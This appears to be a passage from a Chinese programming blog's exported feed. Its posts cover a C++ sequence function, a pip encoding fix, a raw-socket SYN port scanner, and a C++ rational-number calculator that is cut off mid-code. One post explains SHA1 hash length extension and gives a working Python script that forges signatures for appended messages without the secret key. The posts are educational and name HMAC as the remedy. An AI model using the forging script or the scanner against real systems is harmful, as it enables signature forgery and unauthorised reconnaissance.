<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; getSequence(<span class="keyword">int</span> length) &#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; seq;</span><br><span class="line">	seq.push_back(<span class="number">1</span>);</span><br><span class="line">	seq.push_back(<span class="number">2</span>);</span><br><span class="line">	seq.push_back(<span class="number">2</span>);</span><br><span class="line">	seq.reserve(length + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">auto</span> itr = seq.begin() + <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length - <span class="number">3</span>;)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (*itr == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (seq.back() == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				seq.push_back(<span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				seq.push_back(<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (seq.back() == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				seq.push_back(<span class="number">2</span>);</span><br><span class="line">				seq.push_back(<span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				seq.push_back(<span class="number">1</span>);</span><br><span class="line">				seq.push_back(<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			i += <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		++itr;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>编码导致奇怪的 pip 安装问题</title>
    <url>/2018/01/31/%E7%BC%96%E7%A0%81%E5%AF%BC%E8%87%B4%E5%A5%87%E6%80%AA%E7%9A%84%20pip%20%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>因为用的 VisualStudio, 所以 python 由 VisualStudio 下载放在 <code>C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\</code> 中, 然而有时候用pip安装扩展会出现</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Exception:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\compat\\__init__.py&quot;, line 73, in console_to_str</span><br><span class="line">return s.decode(sys.__stdout__.encoding)</span><br><span class="line">UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa1 in position 43: invalid start byte</span><br><span class="line"></span><br><span class="line">During handling of the above exception, another exception occurred:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\basecommand.py&quot;, line 215, in main</span><br><span class="line">status &#x3D; self.run(options, args)</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\commands\\install.py&quot;, line 342, in run</span><br><span class="line">prefix&#x3D;options.prefix_path,</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\req\\req_set.py&quot;, line 784, in install</span><br><span class="line">**kwargs</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\req\\req_install.py&quot;, line 878, in install</span><br><span class="line">spinner&#x3D;spinner,</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\utils\\__init__.py&quot;, line 676, in call_subprocess</span><br><span class="line">line &#x3D; console_to_str(proc.stdout.readline())</span><br><span class="line">File &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python36_64\\lib\\site-packages\\pip\\compat\\__init__.py&quot;, line 75, in console_to_str</span><br><span class="line">return s.decode(&#39;utf-8&#39;)</span><br><span class="line">UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa1 in position 43: invalid start byte</span><br></pre></td></tr></table></figure>

<p>的错误, 问题就出在 <code>proc.stdout.readline()</code> 中, 因为中文版 windows 在控制台中字符页是 gbk, 所以默认的 utf-8 自然会解码错误, 所以把 <code>C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python36_64\lib\site-packages\pip\compat__init__.py</code> 中的所有 utf-8 换成 gbk 就解决了. </p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>自制一个简单的 Hashpump</title>
    <url>/2019/05/11/%E8%87%AA%E5%88%B6%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-Hashpump/</url>
    <content><![CDATA[<p>在学完 MD5/SHA1 之后, 很快就能搞懂 <code>hashpump</code> 的原理, 本质是因为类 <code>MD</code> 哈希函数<br>包括 MD5, SHA1, SHA2 都是将信息填充为一个 <code>Block</code> 长度的倍数以后分 <code>Block</code> 一轮轮计算的,<br>最后输出的是寄存器拼接在一起的值, 所以假设用以下公式计算签名  </p>
<a id="more"></a>

<p>$$ hash(key + msg) = signature $$</p>
<p>假如已经知道了 <code>signature</code>, <code>msg</code> 以及 <code>key</code> 的长度(在实战中可以爆破), 那么完全是可以将所有 <code>Block</code> 里面除了<br>一开始的 key 之外的的内容算出来. 自然而然可以想到, 我们将计算出 <code>signature</code> 时<br>的状态作为我们的起始状态, 也就是将寄存器的值换成哈希函数的输出, 然后就可以在新的 <code>Block</code><br>的里面伪造任意消息, 因为这时候前面 <code>Block</code> 的内容实际上只是为了 <code>padding</code> 最后的消息长度的正确,<br>所以可以在并在不知道 <code>key</code> 的情况下得到 <code>signature</code>. 这时 <code>msg</code> 就变成了<br><code>原来的 msg + padding + 伪造的 msg</code>.  </p>
<p>限制就是必须是 <code>key + msg</code> 的顺序, 如果是 <code>msg + key</code> 的顺序, 伪造的 <code>msg</code> 就必须是<br><code>原来的 msg + key + padding + 伪造的 msg</code>, 出现了 key, 而如果我们有 key 了, 还伪造什么呢 233<br>所以局限还是比较大的, 但漏洞总是存在在哪里, 说不定就有开发者用了呢, 对吧. 所以有专门的 <code>HMAC</code> 算法<br>来生成签名, 抛开 opad 和 ipad 啥的, 原理很简单, 就是用  </p>
<p>$$ hash(key + hash(key + msg)) = signature $$</p>
<p>这样嵌套的方式来计算签名, 拿到的签名值是外层的 <code>hash</code> 的结果, 而内层的 <code>hash(key + msg)</code> 的值长度是不可控的,<br>显然就不能长度扩展了.  </p>
<p>了解这些思路, 写脚本就非常的 ez 了. 简单的对 <code>SHA1</code> 的哈希长度扩展的脚本如下.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sha1 <span class="keyword">import</span> SHA1</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(msg)</span>:</span></span><br><span class="line">    length = len(msg)</span><br><span class="line">    pad = length % <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> pad &gt;= <span class="number">56</span>:</span><br><span class="line">        pad = (<span class="number">64</span> + <span class="number">56</span>) - pad</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pad = <span class="number">56</span> - pad</span><br><span class="line">    <span class="keyword">if</span> pad &gt; <span class="number">0</span>:</span><br><span class="line">        msg.extend([<span class="number">0x80</span>] + [<span class="number">0</span>] * (pad - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    length *= <span class="number">8</span></span><br><span class="line">    length = length % <span class="number">0x10000000000000000</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        b = (length &amp; <span class="number">0xff00000000000000</span>) &gt;&gt; <span class="number">56</span></span><br><span class="line">        length = length &lt;&lt; <span class="number">8</span></span><br><span class="line">        msg.append(b)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pump</span><span class="params">(orghash, orgmsg, keylen, addmsg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(orgmsg) == str:</span><br><span class="line">        orgmsg = orgmsg.encode()</span><br><span class="line">    <span class="keyword">if</span> type(addmsg) == str:</span><br><span class="line">        addmsg = addmsg.encode()</span><br><span class="line">    <span class="keyword">assert</span> len(orghash) == <span class="number">40</span>  <span class="comment"># sha1 20 字节用 16 进制表示为 40 个字符长度</span></span><br><span class="line">    regs = unpack(<span class="string">'&gt;5I'</span>, unhexlify(orghash))  <span class="comment"># 算出之前轮结束的寄存器值, SHA1 是大端存储</span></span><br><span class="line"></span><br><span class="line">    sha1 = SHA1(<span class="string">''</span>)</span><br><span class="line">    sha1.ra, sha1.rb, sha1.rc, sha1.rd, sha1.re = regs</span><br><span class="line"></span><br><span class="line">    newmsg = bytearray()</span><br><span class="line">    newmsg += bytearray([<span class="number">0</span>] * keylen)</span><br><span class="line">    newmsg += bytearray(orgmsg)</span><br><span class="line">    newmsg = padding(newmsg) <span class="comment"># 还原 orghash 的区块, key 用 0 来填充</span></span><br><span class="line"></span><br><span class="line">    retmsg = newmsg[keylen:] <span class="comment"># 返回的 msg</span></span><br><span class="line">    retmsg += bytearray(addmsg)</span><br><span class="line"></span><br><span class="line">    newmsg += bytearray(addmsg)</span><br><span class="line">    newmsg = padding(newmsg) <span class="comment"># 因为最后 8 位是长度信息, 所以得将之前的区块一并来 padding</span></span><br><span class="line">    newmsg = newmsg[<span class="number">-64</span>:] <span class="comment"># 但最后计算时只需要最后一块就行, 因为已经将寄存器设为之前的算出来的结果</span></span><br><span class="line">    sha1.msg = bytearray(newmsg)</span><br><span class="line">    <span class="keyword">return</span> (retmsg, sha1.hexdigest())</span><br></pre></td></tr></table></figure>

<p><code>SHA1</code> 基本来自于<a href="https://github.com/rmb122/Cryptography/blob/master/SHA1.py" target="_blank" rel="noopener">密码学作业</a>, 稍微修改一下, 因为这里需要我们自己控制一个 <code>Block</code>, 是已经 <code>padding</code> 过的了,<br>不用重复, 所以把算结果之前的 <code>padding</code> 给跳过.  </p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">138c138</span><br><span class="line">&lt;         # self.__padding()</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;         self.__padding()</span><br></pre></td></tr></table></figure>

<p>最后当然是能实验成功的~  </p>
<p><img src="https://i.loli.net/2019/05/11/5cd5a7015838e.png" alt="">  </p>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>用 SOCK_RAW 实现一个伪 nmap</title>
    <url>/2018/05/30/%E7%94%A8%20SOCK_RAW%20%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E4%BC%AA%20nmap/</url>
    <content><![CDATA[<p>这几天详细研究了下 nmap 的实现原理, 对 TCP 协议还是蛮好奇的. 刚好 python 的 socket 库十分强大, 支持 SOCK_RAW, 意味着我们完全可以自己实现一个 SYN 端口探测器. 首先自然要了解一下 TCP 协议的结构, 可以在 wikipedia 上查到,  </p>
<a id="more"></a>

<p><img src="https://i.loli.net/2019/03/08/5c8274b5c63d5.png" alt="">  </p>
<p>比较麻烦的是效验和的计算, 还需要源地址和目标地址才能算出来, 否则会被路由直接丢掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeByteArray</span><span class="params">(num, byteSize)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    将数字转化为 bytearray.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    result = bytearray()</span><br><span class="line">    num = bin(num)[<span class="number">2</span>:].zfill(byteSize * <span class="number">8</span>)  <span class="comment">#补零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(num), <span class="number">8</span>):</span><br><span class="line">        result.append(int(num[i:i + <span class="number">8</span>], <span class="number">2</span>))  <span class="comment">#按字节分割</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcCheckSum</span><span class="params">(srcIp, targetIp, tcpHead)</span>:</span></span><br><span class="line">    <span class="string">''''</span></span><br><span class="line"><span class="string">    计算效验和.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    psdHeader = bytearray()</span><br><span class="line">    psdHeader.extend(srcIp)  <span class="comment">#来源 Ip</span></span><br><span class="line">    psdHeader.extend(targetIp)  <span class="comment">#目标 Ip</span></span><br><span class="line">    psdHeader.extend(makeByteArray(<span class="number">0</span>, <span class="number">1</span>))  <span class="comment">#补零</span></span><br><span class="line">    psdHeader.extend(makeByteArray(socket.IPPROTO_TCP, <span class="number">1</span>))  <span class="comment">#TCP 协议号</span></span><br><span class="line">    psdHeader.extend(makeByteArray(len(tcpHead), <span class="number">2</span>))  <span class="comment">#TCP 长度</span></span><br><span class="line">    psdHeader.extend(tcpHead)</span><br><span class="line"></span><br><span class="line">    checkSum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(psdHeader), <span class="number">2</span>):</span><br><span class="line">        checkSum += ((psdHeader[i] &lt;&lt; <span class="number">8</span>) + psdHeader[i + <span class="number">1</span>])</span><br><span class="line">        checkSum = (checkSum &gt;&gt; <span class="number">16</span>) + (checkSum &amp; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">    checkSum = ~checkSum &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> checkSum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeTCPSyn</span><span class="params">(srcIp, targetIp, srcPort, targetPort)</span>:</span></span><br><span class="line">    tcpPayload = bytearray()</span><br><span class="line">    tcpPayload.extend(makeByteArray(srcPort, <span class="number">2</span>))  <span class="comment">#来源端口</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(targetPort, <span class="number">2</span>))  <span class="comment">#目标端口</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(randint(<span class="number">0x10000000</span>, <span class="number">0xAAAAAAAA</span>), <span class="number">4</span>))  <span class="comment">#SYN 序列号, 随机生成一个</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">0</span>, <span class="number">4</span>))  <span class="comment">#ACK 序列号</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">0b0110000000000010</span>, <span class="number">2</span>))  <span class="comment">#数据开始的偏移量、保留字段以及标识符 我们只需要填充 SYN 的标准位为 1 即可</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(randint(<span class="number">300</span>, <span class="number">1460</span>), <span class="number">2</span>))  <span class="comment">#窗口大小, 大小随意</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">0</span>, <span class="number">2</span>))  <span class="comment">#check sum, 先用 0 填充</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">0</span>, <span class="number">2</span>))  <span class="comment">#紧急指针</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">2</span>, <span class="number">1</span>))  <span class="comment">#这个以及下面的为 tcp options</span></span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">4</span>, <span class="number">1</span>))</span><br><span class="line">    tcpPayload.extend(makeByteArray(<span class="number">1460</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    checkSum = makeByteArray(calcCheckSum(srcIp, targetIp, tcpPayload), <span class="number">2</span>)</span><br><span class="line">    tcpPayload[<span class="number">16</span>] = checkSum[<span class="number">0</span>]  <span class="comment">#将 checksum 替换为计算好的值</span></span><br><span class="line">    tcpPayload[<span class="number">17</span>] = checkSum[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> tcpPayload</span><br></pre></td></tr></table></figure>

<p>最后写出来是这样的, 其实并不困难, 主要是比较复杂以及资料相对比较难找. 接下来我们直接通过 SOCK_RAW 发出去就可以了, 注意开启 SOCK_RAW 是需要 root 权限的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transIp2Bytes</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    将 Ip 转换为 bytearray.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    addr = addr.split(<span class="string">"."</span>)</span><br><span class="line">    result = bytearray()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> addr:</span><br><span class="line">        result.extend(makeByteArray(int(num), <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyzeRes</span><span class="params">(response)</span>:</span></span><br><span class="line">    port = (response[<span class="number">20</span>] &lt;&lt; <span class="number">8</span>) + response[<span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (response[<span class="number">33</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>:  <span class="comment">#RST 位</span></span><br><span class="line">        <span class="keyword">return</span> (port, PORT_CLOSE)</span><br><span class="line">    <span class="keyword">elif</span> (response[<span class="number">33</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>:  <span class="comment">#SYN 位</span></span><br><span class="line">        <span class="keyword">return</span> (port, PORT_OPEN)</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">"Invaild head."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPortOpen</span><span class="params">(localAddr, remoteAddr)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    检测端口是否开放, 端口被过滤返回 `PORT_FILTERED`, 端口关闭返回 `PORT_CLOSE`, 开启返回 `PORT_OPEN`  </span></span><br><span class="line"><span class="string">    localAddr, remoteAddr 均为 tuple.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    sck = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    sck.setblocking(<span class="literal">False</span>)  <span class="comment">#设置为非阻塞式</span></span><br><span class="line"></span><br><span class="line">    payload = makeTCPSyn(transIp2Bytes(localAddr[<span class="number">0</span>]), transIp2Bytes(remoteAddr[<span class="number">0</span>]), localAddr[<span class="number">1</span>], remoteAddr[<span class="number">1</span>])</span><br><span class="line">    sck.sendto(payload, remoteAddr)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    response = bytearray()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sck.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    retriedTime = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> len(response) == <span class="number">0</span> <span class="keyword">and</span> retriedTime &lt;= RETRY_TIME:</span><br><span class="line">        sleep(RETRY_WAIT_TIME)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = sck.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(response) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> PORT_FILTERED</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> analyzeRes(response)</span><br></pre></td></tr></table></figure>

<p>如果收到 RST/ACK 包说明端口是关闭的, SYN/ACK 则是开启, 没有收到回复就是被 iptables 之类过滤了. 不过这里其实 SOCK_RAW 可以收到全端口的 TCP 流量, 我比较偷懒就没做过滤了233, 所以可能会有 bug, 要完全版可以在 <a href="https://github.com/rmb122/portScanner" target="_blank" rel="noopener">github</a> 上看看完整的多线程版, 实现的比较完全.</p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>拥有基本 IO 功能的控制台计算器</title>
    <url>/2017/12/29/%E6%8B%A5%E6%9C%89%E5%9F%BA%E6%9C%AC%20IO%20%E5%8A%9F%E8%83%BD%E7%9A%84%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
    <content><![CDATA[<p>第一次写这么长的代码（虽然里面注释什么的水分比较多), 还是蛮有成就感的. 同时这也是我第一次写这么详细的注释233. 毕竟这还是作业对吧. </p>
<a id="more"></a>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;direct.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXIT 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CALC 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HELP 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAVE 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOAD 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RENAME 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">*Function: str2int(longlong作为函数名太长)</span></span><br><span class="line"><span class="comment">*Description: 将string类型转换为long long类型</span></span><br><span class="line"><span class="comment">*************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">str2int</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;string_temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> int_temp;</span><br><span class="line">	<span class="function"><span class="built_in">stringstream</span> <span class="title">stream</span><span class="params">(string_temp)</span></span>;</span><br><span class="line">	stream &gt;&gt; int_temp;</span><br><span class="line">	<span class="keyword">return</span> int_temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">*Function: int2str(longlong作为函数名太长)</span></span><br><span class="line"><span class="comment">*Description: 将long long类型转换为string类型</span></span><br><span class="line"><span class="comment">*************************************************/</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">int2str</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> int_temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> string_temp;</span><br><span class="line">	<span class="built_in">stringstream</span> stream;</span><br><span class="line">	stream &lt;&lt; int_temp;</span><br><span class="line">	stream &gt;&gt; string_temp;</span><br><span class="line">	<span class="keyword">return</span> string_temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rational_Numbers</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MyioEngine</span>;</span><span class="comment">//声明为友元,让其可以访问分子分母</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">string</span> name;<span class="comment">//名字</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> numerator;<span class="comment">//分子</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> denominator;<span class="comment">//分母</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: myabs</span></span><br><span class="line"><span class="comment">	*Description: 求绝对值</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">myabs</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> input)</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (input &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> input;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> -input;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Description: 四种构造函数 并且输入后自动化简</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	Rational_Numbers(<span class="built_in">string</span> _name, <span class="keyword">long</span> <span class="keyword">long</span> _numerator, <span class="keyword">long</span> <span class="keyword">long</span> _denominator) :numerator(_numerator), denominator(_denominator), name(_name) &#123; simplify(); &#125;; </span><br><span class="line">	Rational_Numbers(<span class="keyword">long</span> <span class="keyword">long</span> _numerator, <span class="keyword">long</span> <span class="keyword">long</span> _denominator) :numerator(_numerator), denominator(_denominator), name(<span class="string">"default"</span>) &#123; simplify(); &#125;; </span><br><span class="line">	Rational_Numbers(<span class="keyword">long</span> <span class="keyword">long</span> _numerator) :numerator(_numerator), denominator(<span class="number">1</span>), name(<span class="string">"default"</span>) &#123; simplify(); &#125;;</span><br><span class="line">	Rational_Numbers():numerator(<span class="number">1</span>), denominator(<span class="number">1</span>), name(<span class="string">"default"</span>) &#123;&#125;;<span class="comment">//默认构造函数</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	\*Description: 重载+ - \* / &lt;&lt; &gt;&gt; 符号</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	Rational_Numbers <span class="keyword">operator</span> + (Rational_Numbers &amp;input) <span class="comment">//重载+号</span></span><br><span class="line">	&#123;</span><br><span class="line">		 <span class="function">Rational_Numbers <span class="title">temp</span><span class="params">(numerator\*input.denominator+input.numerator\*denominator,denominator*input.denominator)</span></span>; </span><br><span class="line">		 <span class="keyword">return</span> temp.simplify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Rational_Numbers <span class="keyword">operator</span> - (Rational_Numbers &amp;input) <span class="comment">//重载-号</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">Rational_Numbers <span class="title">temp</span><span class="params">(numerator\*input.denominator - input.numerator\*denominator, denominator*input.denominator)</span></span>;</span><br><span class="line">		<span class="keyword">return</span> temp.simplify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Rational_Numbers <span class="keyword">operator</span> * (Rational_Numbers &amp;input) <span class="comment">//重载*号</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">Rational_Numbers <span class="title">temp</span><span class="params">(numerator\*input.numerator, denominator\*input.denominator)</span></span>;</span><br><span class="line">		<span class="keyword">return</span> temp.simplify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Rational_Numbers <span class="keyword">operator</span> / (Rational_Numbers &amp;input) <span class="comment">//重载/号</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">Rational_Numbers <span class="title">temp</span><span class="params">(numerator\*input.denominator, denominator\*input.numerator)</span></span>;</span><br><span class="line">		<span class="keyword">return</span> temp.simplify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span 